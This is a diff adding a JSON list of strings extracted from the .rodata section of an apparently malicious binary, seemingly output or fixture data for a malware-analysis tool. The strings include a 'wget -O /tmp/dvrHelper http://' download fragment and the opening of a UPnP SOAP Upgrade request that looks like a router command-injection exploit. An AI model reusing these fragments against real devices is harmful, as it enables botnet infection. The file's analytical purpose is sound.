@@ -1,0 +1,39 @@
+{
+    "filtered_strings": [
+        {
+            "value": "wget -O /tmp/dvrHelper http://",
+            "section": ".rodata",
+            "offset": "0x1238a"
+        },
+        {
+            "value": "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>",
+            "section": ".rodata",
+            "offset": "0x12408"
+        },
+        {
+            "value": "/etc/services",
+            "section": ".rodata",
+            "offset": "0x1405a"
+        },
+        {
+            "value": "/etc/resolv.conf",
+            "section": ".rodata",
+            "offset": "0x14071"
+        },
+        {
+            "value": "/etc/config/resolv.conf",
+            "section": ".rodata",
+            "offset": "0x14082"
+        },
+        {
+            "value": "/etc/hosts",
+            "section": ".rodata",
+            "offset": "0x1417c"
+        },
+        {
+            "value": "/etc/config/hosts",
+            "section": ".rodata",
+            "offset": "0x14187"
+        }
+    ]
+}
